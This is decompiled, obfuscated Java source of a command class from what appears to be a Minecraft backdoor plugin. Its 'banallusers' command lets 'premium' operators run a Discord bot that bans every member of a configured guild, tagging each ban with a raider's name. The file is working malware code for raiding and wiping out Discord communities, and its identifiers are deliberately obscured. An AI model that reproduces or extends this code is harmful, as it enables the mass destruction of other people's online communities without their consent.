/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import com.minecraftforceop.jda.jda.api.entities.Member;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class BanallusersCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIllIllllIIlIlIIIlIl, String lllllllllllllIllIllllIIlIlIIlIII, String[] lllllllllllllIllIllllIIlIlIIIlll, Player lllllllllllllIllIllllIIlIlIIIllI) {
        if (lllllllllllllIllIllllIIlIlIIIlIl.premium.contains(lllllllllllllIllIllllIIlIlIIIllI.getName())) {
            if (lllllllllllllIllIllllIIlIlIIIlIl.botEnabled) {
                byte[] lllllllllllllIllIllllIIlIlIIllII = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild lllllllllllllIllIllllIIlIlIIlIll = lllllllllllllIllIllllIIlIlIIIlIl.jda.getGuildById(new String(lllllllllllllIllIllllIIlIlIIllII));
                if (lllllllllllllIllIllllIIlIlIIlIll == null) {
                    lllllllllllllIllIllllIIlIlIIIllI.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    try {
                        lllllllllllllIllIllllIIlIlIIlIll.getMembers().forEach(lllllllllllllIllIllllIIlIIlllIlI -> lllllllllllllIllIllllIIlIlIIlIll.ban((Member)lllllllllllllIllIllllIIlIIlllIlI, 1000, "Wendellmeset").complete());
                    }
                    catch (Exception lllllllllllllIllIllllIIlIlIIIIIl) {
                        // empty catch block
                    }
                    lllllllllllllIllIllllIIlIlIIIllI.sendMessage(Settings.PREFIX("All users were kicked!"));
                }
            } else {
                lllllllllllllIllIllllIIlIlIIIllI.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            lllllllllllllIllIllllIIlIlIIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public BanallusersCommand() {
        BanallusersCommand lllllllllllllIllIllllIIlIlIlIIll;
    }
}

